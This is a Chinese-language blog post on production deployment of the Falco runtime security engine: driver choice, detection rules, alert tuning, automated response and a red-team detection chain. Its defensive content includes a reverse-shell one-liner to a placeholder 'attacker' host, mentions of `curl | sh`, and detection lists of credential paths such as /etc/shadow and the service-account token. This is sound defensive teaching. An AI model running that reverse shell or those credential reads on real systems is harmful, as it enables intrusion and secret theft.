---
title: "Falco 运行时安全实战：从规则开发到生产级调优"
date: 2025-10-03T09:30:00+08:00
draft: false
tags: ["Falco", "运行时安全", "容器安全", "eBPF", "威胁检测"]
categories: ["安全"]
description: "一份来自生产环境的 Falco 实战笔记：从 eBPF 驱动选型、规则开发方法论、误报治理，到与 Falcosidekick、Loki、SIEM 的告警联动，覆盖 0.40/0.41/0.42 三个版本的关键变更与真实踩坑案例。"
summary: "一份来自生产环境的 Falco 实战笔记：从 eBPF 驱动选型、规则开发方法论、误报治理，到与 Falcosidekick、Loki、SIEM 的告警联动，覆盖 0.40/0.41/0.42 三个版本的关键变更与真实踩坑案例。"
toc: true
math: false
diagram: false
keywords: ["Falco", "eBPF", "runtime security", "Falcosidekick", "Kubernetes 安全"]
params:
  reading_time: true
---

## 写在前面

运行时安全（Runtime Security）这个词在 2020 年之前很少有团队认真对待，大家更多的精力放在"构建时"——镜像扫描、SBOM、签名。但从 2022 年开始，几次轰动圈子的供应链攻击事件逐渐让大家意识到：**构建时的防线再厚，也挡不住一个在运行时被注入的恶意行为**。攻击者只要能在 Pod 里执行一次 `curl | sh`、或者读一次 `/etc/shadow`，就能把你半年的 DevSecOps 建设成果毁于一旦。

Falco 是目前开源圈里最成熟的运行时威胁检测引擎，CNCF 毕业项目，背靠 Sysdig 多年积累的系统调用（syscall）采集能力。我从 0.32 版本开始在生产环境部署 Falco，经历了从 kernel module 到 modern eBPF probe 的完整迁移，踩过告警风暴、踩过 CRI 解析失败、踩过 thread table 打爆。这篇文章把这几年里我认为真正重要的经验沉淀下来，不讲"五分钟部署 Falco"这种入门内容，只讲生产化落地。

本文基于 Falco **0.40.0**（2025 年 2 月）、**0.41.0**（2025 年 5 月）、**0.42.0**（2025 年 10 月）三个版本。如果你还在 0.36 或更早，强烈建议先升级再读本文的规则部分，因为新字段（`proc.pgid.*`、`container.*` 新语义）只有高版本才有。

## 一、Falco 架构速览：搞清楚"它到底在看什么"

很多人用 Falco 很久，依然不清楚它的事件源是怎么来的。这里用一张图把数据流描清楚：

```
                      ┌────────────────────────────┐
                      │  Kubernetes API / Audit    │
                      │  Logs (k8saudit plugin)    │
                      └──────────────┬─────────────┘
                                     │
  ┌─────────────┐     ┌──────────────▼─────────────┐     ┌─────────────┐
  │ Linux Kernel│     │       Falco Engine         │     │  Outputs:   │
  │             │     │  ┌──────────────────────┐  │     │  - stdout   │
  │  syscalls  ─┼────▶│  │ Rule Evaluator       │──┼────▶│  - file     │
  │             │ mEBPF│  │ (condition + output) │  │     │  - gRPC     │
  │  tracepoints│     │  └──────────▲───────────┘  │     │  - http     │
  │             │     │             │              │     │  - sidekick │
  │  kprobes    │     │  ┌──────────┴───────────┐  │     └─────────────┘
  └─────────────┘     │  │  libsinsp / libscap  │  │
                      │  │  (event enrichment)  │  │
                      │  └──────────────────────┘  │
                      └────────────────────────────┘
```

Falco 的事件源主要有三类：

1. **系统调用源（syscall）**：通过 kernel module、legacy eBPF probe 或者 modern eBPF probe（CO-RE）从内核拿到 syscall 事件。2025 年的生产环境，**请直接用 modern eBPF probe**，它不需要编译驱动、kernel 5.8+ 就能跑，性能开销比 legacy ebpf 低 10~20%。
2. **Kubernetes Audit 源**：通过 `k8saudit` 插件接收 kube-apiserver 的 audit webhook，检测"谁创建了 privileged pod"这类控制面行为。
3. **插件源（plugin）**：比如 `cloudtrail`、`github`、`okta` 插件，可以接 AWS/GitHub/Okta 的审计日志，把 Falco 变成一个轻量的 CSPM。

**关键认知**：Falco 不是 IDS/IPS，它不会"阻断"任何操作，它只是"观察+告警"。阻断要靠下游，比如 Falco Talon、Argo Events 或者你自己写的 response handler。如果有人给你推销"Falco 能阻断容器逃逸"，基本是不懂装懂。

## 二、驱动选型：modern_ebpf 才是正道

这是我最常被问到的问题之一。Falco 目前支持四种驱动：

| 驱动             | 适用内核 | 部署复杂度 | 性能 | 生产推荐度      |
|------------------|----------|------------|------|-----------------|
| kernel_module    | 任意     | 高（需要匹配内核编译） | 最好 | 不推荐（维护噩梦） |
| legacy ebpf      | 4.14+    | 中         | 一般 | 不推荐（老技术） |
| modern ebpf      | 5.8+     | 低（CO-RE） | 好   | **强烈推荐**    |
| plugin (gVisor)  | 任意     | 高         | 差   | 仅 gVisor 场景  |

我在 0.37 时把所有集群从 legacy ebpf 切到 modern ebpf，单节点 CPU 占用从平均 180m 降到 130m，内存从 450Mi 降到 310Mi。Helm values 只需要改一行：

```yaml
driver:
  kind: modern_ebpf
  modernEbpf:
    leastPrivileged: true   # 0.39+ 支持，降权运行
    cpusForEachBuffer: 2
```

`leastPrivileged: true` 是 0.39 引入的一个重要安全加固——默认情况下 Falco 的 DaemonSet 以 privileged 模式运行（因为要加载 BPF、挂 `/proc`、`/sys`），这其实违反了最小权限。加上这个选项后，Falco 只申请必要的 capability：`CAP_SYS_ADMIN`、`CAP_SYS_RESOURCE`、`CAP_BPF`、`CAP_PERFMON`。

**坑 1：ARM64 节点上 modern ebpf 偶发 verifier 失败**。我们在 Graviton3 的 c7g 实例上遇到过一次启动失败，内核是 5.15，BTF 加载时报 `program too large`。解决办法是升级内核到 6.1，或者在该节点上 fallback 到 legacy ebpf。Falco Helm 0.8+ 支持 per-node 驱动选择：

```yaml
nodeSelector:
  kubernetes.io/arch: arm64
# 再用另一个 DaemonSet 专门跑 arm64 的 legacy ebpf
```

**坑 2：节点 kubelet 开启 `protectKernelDefaults: true` 时，Falco 会因为无法修改 `kernel.perf_event_paranoid` 而拒绝启动**。解决办法是通过 sysctl 初始化脚本预先设置，或者在 `/etc/sysctl.d/` 写死。

## 三、规则开发方法论：先写 macro，再写 rule

Falco 规则文件由三部分组成：`list`、`macro`、`rule`。我见过太多团队一上来就写一大坨 rule，最后维护起来各种 condition 复制粘贴、重复表达式、难以复用。正确的写法是**先抽象 macro，再组合 rule**。

看一个真实例子：检测"容器内运行 shell 并访问敏感目录"。

```yaml
- list: sensitive_paths
  items:
    - /etc/shadow
    - /etc/sudoers
    - /root/.ssh
    - /var/lib/kubelet
    - /var/run/secrets/kubernetes.io/serviceaccount

- list: shell_binaries
  items: [bash, sh, zsh, dash, ash, ksh, busybox]

- macro: spawned_shell
  condition: >
    evt.type = execve and evt.dir = < and
    proc.name in (shell_binaries)

- macro: in_container
  condition: container.id != host

- macro: read_sensitive_path
  condition: >
    evt.type in (open, openat, openat2) and
    evt.dir = < and
    fd.name pmatch (sensitive_paths) and
    not fd.name startswith "/var/lib/kubelet/pods/"

- rule: Shell Spawned Inside Container
  desc: 检测容器内交互式 shell 启动，排除合法场景（init container、debug sidecar）
  condition: >
    spawned_shell and in_container and
    not container.image.repository in (allowed_debug_images) and
    not proc.pname in (allowed_shell_parents)
  output: >
    Shell spawned in container
    (user=%user.name uid=%user.uid container=%container.id
     image=%container.image.repository:%container.image.tag
     shell=%proc.name pname=%proc.pname cmdline=%proc.cmdline
     pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: NOTICE
  tags: [container, shell, mitre_execution, T1059]
```

几个**关键的写规则原则**：

1. **优先用 list**：列表比硬编码好维护，而且支持运行时热加载。
2. **macro 要小且职责单一**：`spawned_shell`、`in_container`、`read_sensitive_path` 各自独立，rule 层只负责组合。
3. **always 加 MITRE ATT&CK 标签**：`T1059` 这种标签不仅便于向上级汇报（合规场景特别有用），也方便后续对接 SIEM 做 kill chain 分析。
4. **output 字段命名规范化**：user、container、image、pod、ns 这五个字段几乎是必备，其他根据规则特点加。做 SIEM 对接时，统一字段能省掉 50% 的 parser 工作。
5. **condition 里优先放"短路字段"**：比如 `evt.type = execve` 放在最前面，Falco 的表达式是短路求值，把过滤效果最好的条件放前面可以显著降低 CPU。

### 0.40+ 的新字段：`proc.pgid.*`

0.40 引入了一组进程组字段，我觉得是近两年最有用的增强之一。之前要检测"一个 shell 的所有子进程"需要自己维护进程树，现在可以直接用：

```yaml
- rule: Reverse Shell via Bash TCP Redirect
  condition: >
    evt.type in (connect, sendto) and
    proc.pgid.name in (shell_binaries) and
    fd.sockfamily = ip and
    not fd.sip in (rfc1918_networks)
  output: >
    Possible reverse shell detected
    (pgid_leader=%proc.pgid.name cmdline=%proc.cmdline
     dest=%fd.rip:%fd.rport pod=%k8s.pod.name)
  priority: CRITICAL
```

这条规则能精准识别 `bash -i >& /dev/tcp/attacker/4444 0>&1` 这种经典反弹 shell，因为即便实际发起 connect 的是内核态的进程（比如 bash 内建），pgid leader 依然是 bash。

## 四、误报治理：生产环境的真正难题

**我敢说 90% 的 Falco 项目最终失败，原因只有一个：告警太多没人看**。默认规则集在一个中等规模的 Kubernetes 集群（200 节点、3000 Pod）一天能产生 5000~20000 条告警，几乎全是业务正常行为触发的误报。治理误报的核心思路有三条：

### 4.1 白名单要放在 macro 层，不要放在 rule 层

错误示范：

```yaml
- rule: Write below etc
  condition: >
    write_etc_common and
    not proc.name in (apt-get, yum, dnf, dpkg) and
    not container.image.repository in (my-ci-runner, my-base-image)
```

把业务白名单直接塞进通用规则的 condition 里，不同团队的白名单会越堆越长，最后一条规则上百行 condition，谁也看不懂。正确的做法是每个团队维护自己的"豁免 macro"，在 base rule 基础上 append：

```yaml
# base rule (社区规则，不动)
- rule: Write below etc
  condition: write_etc_common
  ...

# 企业自定义覆盖层
- macro: write_etc_common
  condition: >
    (original_write_etc_common) and
    not user_known_write_etc_conditions

- macro: user_known_write_etc_conditions
  condition: >
    (proc.name in (apt-get, yum, dnf)) or
    (container.image.repository = "my-registry/ci-runner") or
    (k8s.ns.name = "cert-manager" and fd.name startswith "/etc/ssl/certs/")
```

Falco 规则文件支持"覆盖"（override/append）语义，`- macro: xxx` 重复定义时后加载的会覆盖。通过 `rules_file` 的加载顺序控制：

```yaml
rules_file:
  - /etc/falco/falco_rules.yaml                # 社区 base
  - /etc/falco/rules.d/k8s_audit_rules.yaml    # 社区 k8s audit
  - /etc/falco/overrides/company_overrides.yaml  # 企业覆盖层
  - /etc/falco/overrides/team_a_overrides.yaml   # 团队独立层
```

0.41 版本还引入了**规则覆盖声明式语法**，不再需要完整复制一整条 rule，而是可以用 `override` 关键字只追加 condition：

```yaml
- rule: Write below etc
  override:
    condition: append
  condition: and not user_known_write_etc_conditions
```

这是一个巨大的改进，之前做 override 经常因为社区规则升级导致 condition 漂移。

### 4.2 用 Falcosidekick + Loki 做"告警去重+静默"

Falco 本身只负责触发事件，不关心同一条告警在 5 分钟内触发了 1000 次。这个"降噪"职责应当交给 Falcosidekick 或者下游 SIEM。我们的方案是：

```
Falco ──> Falcosidekick ──> Loki / Alertmanager ──> Webhook（钉钉/飞书）
                       └──> S3 (long-term archive)
```

Falcosidekick 本身不去重，但它可以把事件写到 Loki，然后在 Grafana/Alertmanager 里写聚合告警规则：

```yaml
# Loki ruler
groups:
- name: falco-aggregation
  rules:
  - alert: FalcoCriticalBurst
    expr: |
      sum by (rule, k8s_ns_name) (
        count_over_time({job="falco"} | json | priority="Critical" [5m])
      ) > 10
    for: 2m
    labels:
      severity: page
    annotations:
      summary: "{{ $labels.rule }} 在 ns={{ $labels.k8s_ns_name }} 5分钟内爆发 {{ $value }} 次"
```

这样原始事件全量进 Loki（便于事后取证），但真正推送给值班人员的只有"**聚合后的异常突增**"。我们线上的实践数据：Falco 原始事件峰值 40k/min，经过聚合后值班群消息约 5~20 条/天。

### 4.3 TTL 静默：上线新业务时的"观察期"

新业务上线经常会触发一堆陌生规则（比如某个 Go 服务会调用 `setns` 来做多租户隔离），我们定义了一个"观察期"流程：

1. 新 namespace 创建时自动加入 `observing` 标签
2. Falco 对 observing ns 的规则输出 priority 降一级（CRITICAL → WARNING）
3. 一周后人工 review 该 ns 的 Falco 事件，沉淀到该 ns 的 override 文件
4. 去掉 observing 标签，恢复正常优先级

这个流程帮我们把"上线一个新业务导致 oncall 被刷屏"的事故彻底消灭。

## 五、Falcosidekick 部署与路由策略

Falcosidekick 是 Falco 的"事件中继器"，支持 60+ 种 output target。我的生产部署 values 长这样：

```yaml
falcosidekick:
  enabled: true
  replicaCount: 2
  config:
    debug: false
    customfields: "cluster:us-prod,region:us-west-2"
    templatedfields: "pod_url:https://grafana.example.com/d/pod/{{ .OutputFields.k8s_pod_name }}"

    # 路由：只把 ERROR/CRITICAL 推钉钉，全量进 Loki
    loki:
      hostport: "http://loki-gateway.logging.svc:3100"
      minimumpriority: "debug"
      customlabels: "source:falco"
    alertmanager:
      hostport: "http://alertmanager.monitoring.svc:9093"
      minimumpriority: "warning"
      expireafter: 300
    webhook:
      address: "http://dingtalk-webhook.alert.svc/falco"
      minimumpriority: "critical"
      customheaders: "X-Source:falco-us-prod"

    # 归档
    aws:
      s3:
        bucket: "falco-events-archive"
        prefix: "us-prod/"
        region: "us-west-2"
        minimumpriority: "notice"
```

**坑 3：`templatedfields` 在高版本才支持，低版本会静默忽略**。这个字段特别有用，能把告警变成"带上下文链接的富告警"，比如直接点开就是该 Pod 的 Grafana Dashboard。

**坑 4：Falcosidekick 的 `expireafter` 对 Alertmanager 输出非常重要**。Falco 事件默认是 "firing"，Alertmanager 会一直认为告警在触发，不设 expire 会导致告警永不消失。一般设置为 300~600 秒。

## 六、与 Falco Talon 联动做"自动响应"

从 2024 年开始，Falco 社区推出了 Falco Talon 这个响应引擎，把"检测—响应"的闭环做起来了。典型场景是：检测到容器内反弹 shell，自动 `kubectl delete pod` 或者打网络隔离标签。

Talon 的规则语法示意：

```yaml
rules:
  - name: "Terminate reverse shell pods"
    match:
      rules: [ "Reverse Shell via Bash TCP Redirect" ]
      priority: "critical"
    actions:
      - action: "kubernetes:terminate"
        parameters:
          grace_period_seconds: 0
      - action: "kubernetes:label"
        parameters:
          labels:
            security.incident/quarantined: "true"
            security.incident/rule: "{{ .Rule }}"
      - action: "webhook:call"
        parameters:
          url: "https://pagerduty.example.com/incident"
          method: "POST"
```

**真实案例**：2025 年 8 月我们在 US-QA 集群触发过一次真实告警——一个开发测试 Pod 里跑了个爬虫脚本，被挖矿程序入侵（攻击者通过公开的 Redis 6379 反向注入）。Falco 检测到 `xmrig` 进程 + 异常出站连接，Talon 在 4 秒内 kill 了 Pod 并打上隔离标签。从检测到响应全链路 4 秒，比值班人接收告警的时间还短。

但 Talon 要谨慎用，以下几类规则**绝对不能自动响应**：
- 只有 WARNING/NOTICE 级别的规则（误报率太高）
- 涉及 kube-system、cert-manager、Istio 控制面的规则（误杀系统组件灾难性后果）
- 没有 MITRE 标签的规则（置信度不够）

## 七、性能调优：thread table、ring buffer、event filter

### 7.1 thread table 爆表

0.42 之前，Falco 的 thread table 默认容量 131072，在一些 CI/CD 集群（短生命周期容器爆多）会打满。打满后的表现是 Falco 开始漏采样，日志里出现：

```
Thread table full, dropping events. Consider increasing engine.thread_table_size
```

0.42 引入的 `auto_purge` 配置是个好东西：

```yaml
engine:
  kind: modern_ebpf
  thread_table_size: 262144
  thread_table_auto_purge:
    enabled: true
    interval_ms: 60000
    threshold: 0.85
```

意思是每 60 秒检查一次，占用率超过 85% 就主动清理已退出的 thread entry。实测开启后 CI 集群的 drop 率从 0.8% 降到 0。

### 7.2 ring buffer 大小

modern eBPF 的 ring buffer 默认每 CPU 8MB，高核机器（比如 64 核）就是 512MB，对于中小节点来说太奢侈。可以通过 `cpus_for_each_buffer` 调整——多个 CPU 共享一个 buffer：

```yaml
modernEbpf:
  cpusForEachBuffer: 4   # 4 个 CPU 共享一个 ring buffer
```

这个值的选取原则：`总 buffer 大小 = 节点 CPU 数 / cpus_for_each_buffer * 8MB`，控制在 64~128MB 比较合适。

### 7.3 syscall filter：少采总比多采好

默认 Falco 订阅约 180 个 syscall。如果你的规则集用不到那么多，可以主动缩减：

```yaml
base_syscalls:
  custom_set:
    - execve
    - execveat
    - connect
    - accept
    - accept4
    - open
    - openat
    - openat2
    - unlink
    - unlinkat
    - rename
    - renameat
    - setns
    - unshare
    - clone
    - clone3
    - fork
    - vfork
  repair: true
```

`repair: true` 会自动补齐必要的"兄弟 syscall"（比如只订阅了 `open` 会自动加上 `close`，保证 fd 跟踪正确）。我的一个高流量节点上，这样裁剪后 CPU 从 220m 降到 90m。

## 八、与 k8saudit 插件联动：检测控制面攻击

syscall 能看到"容器里发生了什么"，但看不到"谁通过 API 创建了 privileged pod"。这就需要 k8saudit 插件。

部署方式有两种：
1. **Webhook 模式**：kube-apiserver 配置 audit webhook 指向 Falco
2. **EKS / AKS**：通过 CloudWatch / Log Analytics 转发

我更推荐 Webhook 模式，延迟低、事件完整。kube-apiserver 的 manifest 改动：

```yaml
- --audit-webhook-config-file=/etc/kubernetes/audit-webhook.yaml
- --audit-policy-file=/etc/kubernetes/audit-policy.yaml
- --audit-webhook-batch-max-wait=1s
```

audit-policy.yaml 里只需要记录"敏感操作"，不要全量记录（性能灾难）：

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages: ["RequestReceived"]
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods", "services", "secrets", "serviceaccounts"]
      - group: "rbac.authorization.k8s.io"
        resources: ["*"]
  - level: Metadata
    resources:
      - group: ""
        resources: ["configmaps"]
  - level: None   # 其他忽略
```

Falco 侧的配置：

```yaml
plugins:
  - name: k8saudit
    library_path: libk8saudit.so
    init_config:
      maxEventSize: 262144
      webhookMaxBatchSize: 12582912
    open_params: "http://:9765/k8s-audit"
  - name: json
    library_path: libjson.so

load_plugins: [k8saudit, json]
```

一条典型的 k8saudit 规则：

```yaml
- rule: Privileged Pod Created
  desc: 检测特权 Pod 创建
  condition: >
    kevt and pod and kcreate and
    ka.req.pod.containers.privileged intersects (true) and
    not ka.user.name in (allowed_privileged_users) and
    not ka.target.namespace in (kube-system, falco, calico-system)
  output: >
    Privileged pod created
    (user=%ka.user.name pod=%ka.resp.name ns=%ka.target.namespace
     image=%ka.req.pod.containers.image)
  priority: WARNING
  source: k8s_audit
  tags: [k8s, mitre_privilege_escalation, T1611]
```

## 九、真实攻防案例：一次内网横向移动的检测链

2025 年初我们做过一次红队演练，攻击者拿到了一个低权限 Pod 的 exec 权限（模拟 RBAC 配置错误）。从 Falco 的视角看到的完整攻击链：

**步骤 1** (T+0s)：攻击者 exec 进 Pod，执行 `id` 查看身份
```
Rule: Terminal shell in container
Priority: NOTICE
```

**步骤 2** (T+8s)：尝试读取 service account token
```
Rule: Read sensitive file trusted after startup
Priority: WARNING
output: file=/var/run/secrets/kubernetes.io/serviceaccount/token
```

**步骤 3** (T+15s)：用 token 调用 kube-apiserver 做枚举
```
Rule: K8s API Recon (自定义)
Priority: WARNING
source: k8s_audit
```

**步骤 4** (T+45s)：下载内网工具（curl 到 192.168.x.x）
```
Rule: Outbound Connection to Internal IP
Priority: NOTICE
```

**步骤 5** (T+68s)：尝试 mount /proc/1/root
```
Rule: Mount Launched in Privileged Container
Priority: CRITICAL      <── 触发 Talon 自动隔离
```

从步骤 1 到步骤 5，Falco 累计产生了 5 条相关事件，前 4 条单独看都是低危的，但是**通过 SIEM 的关联规则把它们聚合起来**，就形成了一条非常明确的 kill chain。我们的 Loki ruler 有这样一条关联规则：

```logql
sum by (k8s_pod_name) (
  count_over_time({job="falco", priority=~"Notice|Warning|Critical"}
    | json
    | rule =~ "Terminal shell.*|Read sensitive.*|K8s API Recon|Outbound.*Internal.*|Mount.*Privileged.*"
    [2m])
) >= 3
```

凡是 2 分钟内同一 Pod 触发了 3 条以上"侦察类"规则，直接拉 P1 告警。这次红队演练，我们在步骤 5 触发前（也就是 T+45s 左右）就已经拉了告警，值班人员比 Talon 的自动响应更早看到事件。

## 十、版本升级踩坑记录

### 10.1 从 0.37 升到 0.40：字段重命名

0.40 把一批老字段标记 deprecated，比如 `proc.tid` → `thread.tid`。如果你的自定义规则里用了老字段，Falco 会打 warning 但不会报错，容易被忽略。建议升级后跑一次：

```bash
falco --list-fields | grep -i deprecated
falco -v -r /etc/falco/rules.d/ 2>&1 | grep -i warning
```

### 10.2 0.41 的 container engine 重写

0.41 重写了容器引擎适配层，好处是性能更好、支持更多 runtime（包括 containerd 2.0、Podman 5、CRI-O 1.31），坏处是**早期版本的 containerd（1.5 以下）可能出现 container.id 无法解析**。我们在一个老集群遇到过，解决办法是升级 containerd 到 1.7+。

### 10.3 0.42 的 capture file 功能

0.42 新增了 `.scap` 文件录制能力，可以把一段时间内的所有 syscall 录下来，事后用 `sysdig` 重放。这个功能在事件调查时极其有用——我们在一次数据外传事件调查中，用 `.scap` 文件精确还原了攻击者的每一个 `write` 调用，直接把外传的数据内容抓出来了。

开启方式：

```yaml
capture:
  enabled: true
  path: "/var/lib/falco/captures"
  max_size_mb: 500
  max_files: 10
  rules_triggering: ["Critical.*"]   # 只在 critical 规则触发时录制
```

注意 `.scap` 文件很大，记得定期清理。

## 十一、写在最后

Falco 不是"装上就完事"的工具，它是一个需要**持续投入规则开发和运维**的平台。我的建议是：

1. 有专人（至少 0.5 HC）负责 Falco 规则维护和误报治理
2. 规则改动必须走 GitOps，禁止 kubectl 直改 ConfigMap
3. 每个季度做一次规则 review：删掉常年不触发的（可能条件错了）、拆分告警过多的
4. 红蓝对抗是最好的规则验证手段，没有之一

运行时安全的本质不是"防住所有攻击"，而是"攻击发生时你能不能在 5 分钟内发现、30 分钟内响应"。Falco 加上合理的告警路由和响应闭环，完全可以把一个中等规模的 Kubernetes 集群武装到接近 Sysdig 商业版的水平，而成本只是几个 DaemonSet 的 CPU 开销。

下一篇我会写 SPIFFE/SPIRE 的工作负载身份实践，那是零信任网络体系的另一块关键拼图——Falco 解决"谁在作恶"，SPIRE 解决"谁是谁"。
